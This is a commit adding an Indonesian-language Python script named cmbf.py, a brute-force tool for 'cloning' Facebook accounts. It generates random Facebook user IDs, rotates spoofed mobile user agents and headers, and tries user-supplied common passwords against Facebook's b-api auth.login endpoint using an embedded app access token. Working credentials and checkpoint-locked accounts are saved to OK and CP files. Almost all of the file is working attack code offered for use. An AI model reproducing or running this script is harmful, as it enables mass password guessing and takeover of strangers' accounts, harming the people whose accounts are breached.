69cd10752ad0e91e59dba9155f91e05d811446b1
HIKMAT GANS:V <104029463+HIKMAT-xyz@users.noreply.github.com>
2022-08-14 11:50:47 +0700

    Add files via upload

---
+++ cmbf.py
@@ -0,0 +1,446 @@
+# Author by HikmatXD
+# Jangan Keras Merecode Script Kami!!! 
+# https://github.com/HIKMAT-xyz
+# Jangan lupa follow github saya:)
+     
+     # Corporation Cloning Multi Brute Force
+     # Tricker Not Hacker
+     # Fb : Hikmat Ceremony Queenz Sr.
+     # Whastapp : 082115413282
+
+# Grup Whastapp Admin : https://chat.whatsapp.com/DvXb23TbzQ1CfDvXwr2ifj
+# Script Ini 100% Open Source Code:) 
+# Kalo Ada Yang Jual Script Gw Bilang Yak! 
+# Hai Perikod:) 
+
+import requests,bs4,os,sys,json,datetime,time,rich,re,random,threading,zlib,base64,marshal,binascii,time,py_compile
+
+from concurrent.futures import ThreadPoolExecutor as tren
+from bs4 import BeautifulSoup as sop
+from rich.panel import Panel as panel
+from rich import print as vprint
+from random import randint
+from concurrent.futures import ThreadPoolExecutor as tread
+from bs4 import BeautifulSoup as biutipulsop
+
+FR = {'1':'januari','2':'februari','3':'maret','4':'april','5':'mei','6':'juni','7':'juli','8':'agustus','9':'september','10':'oktober','11':'november','12':'desember'}
+tgl = datetime.datetime.now().day
+bln = FR[(str(datetime.datetime.now().month))]
+thn = datetime.datetime.now().year
+sekarang = str(tgl)+"-"+str(bln)+"-"+str(thn)
+okz = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
+cpz = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
+id = []
+HikmatXD = 0
+cp = 0
+ua_crack = []
+ok = 0
+
+for xd in range(10000):
+	a='Mozilla/5.0 (Linux; Android 4.1.2;'
+	b=random.randrange(1, 9)
+	c=random.randrange(1, 9)
+	d='GT-N8000'
+	e=random.randrange(100, 9999)
+	f='Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
+	g=random.randrange(1, 9)
+	h=random.randrange(1, 4)
+	i=random.randrange(1, 4)
+	j=random.randrange(1, 4)
+	k='Iron Safari/537.36'
+	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
+	ua_crack.append(uaku)
+
+
+	aa='Mozilla/5.0 (Linux; Android 6.0.1;'
+	b=random.choice(['6','7','8','9','10','11','12'])
+	c=' Nexus 6P Build/MMB29P)'
+	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+	e=random.randrange(1, 999)
+	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
+	h=random.randrange(73,100)
+	i='0'
+	j=random.randrange(4200,4900)
+	k=random.randrange(40,150)
+	l='Mobile Safari/537.36'
+	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
+	ua_crack.append(uaku2)
+
+for xyzx in range(1000):
+	rr = random.randint
+	rc = random.choice
+	aZ = ['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
+	ugent1 = f"Mozilla/5.0 (Linux; Android {str(rr(8,10))}; Redmi {str(rr(4,9))} Build/PPR1.{str(rr(111111,199999))}.011; en-us) AppleWebKit/537.36 (KHTML, like Gecko) UCBrowser/79.0.{str(rr(1111,9999))}.136 Mobile Safari/537.36 Puffin/9.7.2.{str(rr(11111,99999))}AP"
+	if ugent1 in ua_crack:pass
+	else:ua_crack.append(ugent1)
+	ugent2 = f"Mozilla/5.0 (Linux; U; Android {str(rr(8,10))}; en-US; Redmi Note {str(rr(5,8))} Build/PKQ1.{str(rr(111111,199999))}.00{str(rr(1,9))} AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.{str(rr(1111,6666))}.2 UCBrowser/13.4.0.{str(rr(1111,6666))} Mobile Safari/537.36"
+	if ugent2 in ua_crack:pass
+	else:ua_crack.append(ugent2)
+	ugent3 = f"Mozilla/5.0 (Linux; U; Android {str(rr(7,12))}; en-US; SM-{str(rc(aZ))}{str(rr(1111,9999))}{str(rc(aZ))}) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Mobile UCBrowser/3.4.3.{str(rr(111,999))}"
+	if ugent3 in ua_crack:pass
+	else:ua_crack.append(ugent3)
+	
+for xnxx in range(10000):
+	a='Mozilla/5.0 (Symbian/3; Series60/'
+	b=random.randrange(1, 9)
+	c=random.randrange(1, 9)
+	d='Nokia'
+	e=random.randrange(100, 9999)
+	f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
+	g=random.randrange(1, 9)
+	h=random.randrange(1, 4)
+	i=random.randrange(1, 4)
+	j=random.randrange(1, 4)
+	k='Mobile Safari/535.1'
+	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
+	ua_crack.append(uaku)
+
+
+	aa='Mozilla/5.0 (Linux; U; Android'
+	b=random.choice(['6','7','8','9','10','11','12'])
+	c=' en-us; GT-'
+	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+	e=random.randrange(1, 999)
+	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
+	h=random.randrange(73,100)
+	i='0'
+	j=random.randrange(4200,4900)
+	k=random.randrange(40,150)
+	l='Mobile Safari/537.36'
+	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
+	ua_crack.append(uaku2)
+
+for yzirx in range(10):
+	a='Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S'
+	b=random.randrange(100, 9999)
+	c=random.randrange(100, 9999)
+	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+	e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+	g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+	h=random.randrange(1, 9)
+	i='; U; Bada/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/'
+	j=random.randrange(1, 9)
+	k=random.randrange(1, 9)
+	l='Mobile WVGA SMM-MMS/1.2.0 OPN-B'
+	uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'
+
+try:ua_crack=open("useragent.txt","r").read().splitlines()
+except:ua_crack=["nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+","Mozilla/5.0 (Linux; Android 8.0.0; RNE-L21 Build/HUAWEIRNE-L21; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.4896.58 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/360.0.0.30.113;]"]
+
+
+def clear():
+	os.system('clear')
+def jalan(xnxx):
+	for ewe in xnxx + '\n':
+		sys.stdout.write(ewe);sys.stdout.flush();time.sleep(0.05)
+		
+P = "\x1b[0;97m" # Putih
+M = "\x1b[0;91m" # Merah
+H = "\x1b[0;92m" # Hijau
+K = "\x1b[0;93m" # Kuning
+B = "\x1b[0;94m" # Biru
+U = "\x1b[0;95m" # Ungu
+O = "\x1b[0;96m" # Biru Muda
+N = "\033[0m"    # Warna Mati
+o = '\033[1;36m'
+
+Z2 = "[#000000]" # HITAM
+M2 = "[#FF0000]" # MERAH
+M3 = "#FF0000" # MERAH
+H2 = "[#00FF00]" # HIJAU
+H3 = "#00FF00" # HIJAU
+K2 = "[#FFFF00]" # KUNING
+K3 = "#FFFF00" # KUNING
+B2 = "[#00C8FF]" # BIRU
+B3 = "#00C8FF" # BIRU
+U2 = "[#AF00FF]" # UNGU
+U3 = "#AF00FF" # UNGU
+N2 = "[#FF00FF]" # PINK
+N3 = "#FF00FF" # PINK
+O2 = "[#00FFFF]" # BIRU MUDA
+O3 = "#00FFFF" # BIRU MUDA
+P2 = "[#FFFFFF]" # PUTIH
+P3 = "#FFFFFF" # PUTIH
+J2 = "[#FF8F00]" # JINGGA
+J3 = "#FF8F00" # JINGGA
+A2 = "[#AAAAAA]" # ABU-ABU
+warna_warni_biasa=random.choice([H,K,M,O,B,U])
+warna_warni_rich=random.choice([J3,K3,H3,P3,O3,N3,U3,B3,M3])
+warna_warni_rich_cerah=random.choice([J3,K3,H3,O3,N3,U3,B3])
+garis = f" {P}[{warna_warni_biasa}•{P}]"
+
+def banner():
+	os.system("clear")
+	print(f"""
+\t_________     _____   __________ ___________
+\t\_   ___ \   /     \  \______   \\_   _____/
+\t/    \  \/  /  \ /  \  |    |  _/ |    __)  
+\t\     \____/    Y    \ |    |   \ |     \   
+\t \______  /\____|__  / |______  / \___  /   
+\t        \/         \/         \/      \/• Cloning Multi Brute Force •
+\t\t{garis} author by {K}HikmatXD""")
+
+now = datetime.datetime.now()
+hour = now.hour
+if hour < 4:
+  hhl = "selamat dini hari"
+elif 4 <= hour < 12:
+  hhl = "selamat pagi"
+elif 12 <= hour < 15:
+  hhl = "selamat siang"
+elif 15 <= hour < 17:
+  hhl = "selamat sore"
+elif 17 <= hour < 18:
+  hhl = "selamat petang"
+else:
+  hhl = "selamat malam"
+
+def menu():
+	banner()
+	print("")
+	x=f"{P2}[01] cloning with 2009-2010\n{P2}[02] cloning with 2011-2014\n{P2}[03] check hasil cloning\n{P2}[{M2}00{P2}] exit"
+	vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
+	HikmatXD = input(f"{garis} pilih : {H}")
+	if HikmatXD in ["1","01"]:
+		cloning_2009_2010()
+	elif HikmatXD in ["2","02"]:
+		cloning_2011_2014()
+	elif HikmatXD in ["3","03"]:
+		hasil_cloning()
+	elif HikmatXD in ["0","00"]:
+		jalan(f"{garis} terimakasih telah memakai script cmbf ya bree:) ")
+		exit()
+	else:
+		jalan(f"{garis} isi yang benar ")
+		menu()
+
+def hasil_cloning():
+	print("")
+	x=f"{P2}[01] lihat hasil crack {H2}ok\n{P2}[02] lihat hasil crack {K2}cp\n{P2}[{H2}03{P2}] kembali"
+	vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
+	inhasil = input(f"{garis} pilih : {H}")
+	if inhasil in ["1","01"]:
+		try:c_o_k = os.listdir('OK')
+		except FileNotFoundError:
+			jalan(garis+" tidak ada hasil")
+			time.sleep(2)
+			hasil_cloning()
+		if len(c_o_k)==0:
+			jalan(garis+" tidak ada hasil")
+			time.sleep(2)
+			hasil_cloning()
+		else:
+			x=f"\t\t{P2} hasil ok"
+			vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
+			cuih = 0
+			lol = {}
+			for kaoo in c_o_k:
+				try:hikmat = open('OK/'+kaoo,'r').readlines()
+				except:continue
+				cuih+=1
+				if cuih<10:
+					__oo = '0'+str(cuih)
+					lol.update({str(cuih):str(kaoo)})
+					lol.update({__oo:str(kaoo)})
+					x=f"{P2}[{H2}{__oo}{P2}] {kaoo} • {str(len(hikmat))} akun{P2}"
+					vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
+					#print(P+' •'+H+__oo+P+'• '+kaoo+' • '+str(len(hikmat))+' akun'+P)
+				else:
+					lol.update({str(cuih):str(kaoo)})
+					x=f"{P2}[{H2}{cuih}{P2}] {kaoo} • {str(len(hikmat))} akun{P2}"
+					vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
+					#print(P+' •'+H+str(cuih)+P+'• '+kaoo+' • '+str(len(hikmat))+' akun'+P)
+			x=f"{P2}pilih hasil untuk ditampilkan"
+			vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
+			geeh = input(garis+" pilih : "+H)
+			try:geh = lol[geeh]
+			except KeyError:
+				print(garis+" pilihan tidak ada")
+				exit()
+			try:lin = open('OK/'+geh,'r').read()
+			except:
+				jalan(garis+" file tidak ditemukan") 
+				time.sleep(2)
+				hasil_cloning()
+			jalan(garis+" list akun ok kamu\n") 
+			#x=f"{P2}cd OK*-->{geh}"
+			#vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
+			hus = os.system('cd OK && cat '+geh)
+			jalan("\n"+garis+" list akun ok kamu") 
+			input(garis+" kembali")
+			menu()
+	elif inhasil in ["2","02"]:
+		try:c_o_k = os.listdir('CP')
+		except FileNotFoundError:
+			jalan(garis+" tidak ada hasil")
+			time.sleep(2)
+			hasil_cloning()
+		if len(c_o_k)==0:
+			jalan(garis+" tidak ada hasil")
+			time.sleep(2)
+			hasil_cloning()
+		else:
+			x=f"\t\t{P2} hasil cp"
+			vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
+			cuih = 0
+			lol = {}
+			for kaoo in c_o_k:
+				try:hikmat = open('CP/'+kaoo,'r').readlines()
+				except:continue
+				cuih+=1
+				if cuih<10:
+					__oo = '0'+str(cuih)
+					lol.update({str(cuih):str(kaoo)})
+					lol.update({__oo:str(kaoo)})
+					x=f"{P2}[{H2}{__oo}{P2}] {kaoo} • {str(len(hikmat))} akun{P2}"
+					vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
+					#print(P+' •'+H+__oo+P+'• '+kaoo+' • '+str(len(hikmat))+' akun'+P)
+				else:
+					lol.update({str(cuih):str(kaoo)})
+					x=f"{P2}[{H2}{cuih}{P2}] {kaoo} • {str(len(hikmat))} akun{P2}"
+					vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
+					#print(P+' •'+H+str(cuih)+P+'• '+kaoo+' • '+str(len(hikmat))+' akun'+P)
+			x=f"{P2}pilih hasil untuk ditampilkan"
+			vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
+			geeh = input(garis+" pilih : "+H)
+			try:geh = lol[geeh]
+			except KeyError:
+				print(garis+" pilihan tidak ada")
+				exit()
+			try:lin = open('CP/'+geh,'r').read()
+			except:
+				jalan(garis+" file tidak ditemukan") 
+				time.sleep(2)
+				hasil_cloning()
+			jalan(garis+" list akun cp kamu\n") 
+			#x=f"{P2}cd CP*-->{geh}"
+			#vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
+			hus = os.system('cd CP && cat '+geh)
+			jalan("\n"+garis+" list akun cp kamu") 
+			input(garis+" kembali")
+			menu()
+	elif inhasil in ["0","00"]:
+		menu()
+	else:
+		jalan(f"{garis} isi yang benar ")
+		hasil_cloning()
+
+
+
+def cloning_2011_2014():
+	x = 11111111
+	xx = 99999999
+	idx = "10000" 
+	print("")
+	#x=f"{P2}contoh : {H2}4000"
+	#vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
+	limit = int(input("%s mau berapa id : %s"%(garis,H)))
+	try:
+		for n in range(limit):
+			_ = random.randint(x,xx)
+			__ = idx
+			id.append(__+str(_))
+		print(f"{garis} total id : {H}{len(id)}")
+		with tread(max_workers=30) as HikmatXD:
+			x=f"{P2}contoh password : {H2}123456,1234567,123456789\n{P2}pakai ({H2},{P2}) untuk menambahkan password tambahan"
+			vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
+			list_pw = input(f"{garis} masukan password list : {H}")
+			if len(list_pw)<=5:
+					exit(f"{garis} password minimal 6 angka ")
+			x=f"{P2}crack memakai password {H2}{list_pw}"
+			vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
+			x=f"{P2}crack cp tersimpan di {K2}CP/{cpz}\n{P2}crack ok tersimpan di {H2}OK/{okz}\n{P2}mode pesawatkan 5 detik klo tidak ada hasil!! "
+			vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
+			for user in id:
+				HikmatXD.submit(api, user, list_pw.split(","))
+		print("")
+		if ok != 0 or cp != 0:
+			x=f"{P2}hasil cp mu : {K2}{cp}\n{P2}hasil ok mu : {H2}{ok}"
+			vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
+			input(garis+" kembali ")
+			menu()
+		else:
+			x=f"{P2}kok gada hasil? makanya ganteng klo gk ganteng kemungkinan kecil dapet result, intinya harus ganteng ajg:v"
+			vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
+			input(garis+" kembali ")
+			menu()
+	except Exception as e:exit(str(e))
+
+def cloning_2009_2010():
+	x = 111111111
+	xx = 999999999
+	idx = "100000" 
+	print("")
+	#x=f"{P2}contoh : {H2}4000"
+	#vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
+	limit = int(input("%s mau berapa id : %s"%(garis,H)))
+	try:
+		for n in range(limit):
+			_ = random.randint(x,xx)
+			__ = idx
+			id.append(__+str(_))
+		print(f"{garis} total id : {H}{len(id)}")
+		with tread(max_workers=30) as HikmatXD:
+			x=f"{P2}contoh password : {H2}123456,1234567,123456789\n{P2}pakai ({H2},{P2}) untuk menambahkan password tambahan"
+			vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
+			list_pw = input(f"{garis} masukan password list : {H}")
+			if len(list_pw)<=5:
+					exit(f"{garis} password minimal 6 angka ")
+			x=f"{P2}crack memakai password {H2}{list_pw}"
+			vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
+			x=f"{P2}crack cp tersimpan di {K2}CP/{cpz}\n{P2}crack ok tersimpan di {H2}OK/{okz}\n{P2}mode pesawatkan 5 detik klo tidak ada hasil!! "
+			vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
+			for user in id:
+				HikmatXD.submit(api, user, list_pw.split(","))
+		print("")
+		if ok != 0 or cp != 0:
+			x=f"{P2}hasil cp mu : {K2}{cp}\n{P2}hasil ok mu : {H2}{ok}"
+			vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
+			input(garis+" kembali ")
+			menu()
+		else:
+			x=f"{P2}kok gada hasil? makanya ganteng klo gk ganteng kemungkinan kecil dapet result, intinya harus ganteng ajg:v"
+			vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
+			input(garis+" kembali ")
+			menu()
+	except Exception as e:exit(str(e))
+
+def api(uiz, pwr):
+	global cp,ok,HikmatXD
+	ua_crack = ["Mozilla/5.0 (Linux; Android 10; RMX2185) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 12; TECNO CG6j) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 9; Redmi Note 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 9; SM-J730F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 12; RMX3085 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/378.0.0.18.112;]","Mozilla/5.0 (Mobile; LYF/F320B/LYF-F320B-002-02-56-250322;Android; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.3.2","Mozilla/5.0 (Mobile; LYF/F320B/LYF-F320B-002-02-56-250322;Android; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.3.2","Mozilla/5.0 (Mobile; Qmobile_4Gplus; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.1.2","Mozilla/5.0 (Mobile; Tech_Pad_Kaios_One_3G; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.1.1","Mozilla/5.0 (X11; CrOS armv7l 13597.84.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.187 Safari/537.36 Mozilla/5.0 (Mobile; Nokia 8000 4G; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.4","Mozilla/5.0 (Mobile; Nokia_800_Tough; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.2.2","Mozilla/5.0 (Mobile; LYF/F300B/LYF-F300B-001-01-15-130718-i;Android; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5 Edg/93.0.4577.63","Mozilla/5.0 (Mobile; LYF/F220B/LYF-F220B-003-01-45-051119;Android; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5","Mozilla/5.0 (Mobile; LOGIC_LOGIC_B8K_3G; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.1.2","Mozilla/5.0 (Linux; rv:48.0; U; US) Gecko/48.0 Firefox/48.0 KAIOS/2.5","Mozilla/5.0 (Mobile; LYF/F220B/LYF-F220B-003-01-50-091120;Android; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5","Mozilla/5.0 (Mobile; Digit_Digit4G_4G; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.2.2"]
+	ua = random.choice(ua_crack)
+	runc= random.choice([K,M,U,O,B,H]) 
+	sys.stdout.write("\r %s• %scracked %s%s/%s %sok:%s %scp:%s "%(P,runc,P,HikmatXD,len(id),H,ok,K,cp)); sys.stdout.flush()
+	for pw in pwr:
+		pw = pw.lower()
+		ses = requests.Session()
+		headers = {
+			"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), 
+			"x-fb-sim-hni": str(random.randint(20000, 40000)), 
+			"x-fb-net-hni": str(random.randint(20000, 40000)), 
+			"x-fb-connection-quality": "EXCELLENT",
+			"x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
+			"user-agent": ua, 
+			"content-type": "application/x-www-form-urlencoded", 
+			"x-fb-http-engine": "Liger"
+		}
+		response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uiz)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
+		if "session_key" in response.text and "EAAG" in response.text:
+			print(f"\r {H}*--> {uiz}|{pw}")
+			open('OK/'+okz,'a').write(uiz+'|'+pw+'\n')
+			ok+=1
+			break
+		elif "www.facebook.com" in response.json()["error_msg"]:
+			print(f"\r {K}*--> {uiz}|{pw}")
+			open('CP/'+cpz,'a').write(uiz+'|'+pw+'\n')
+			cp+=1
+			break
+		else:
+			continue
+
+	HikmatXD +=1
+	
+menu()
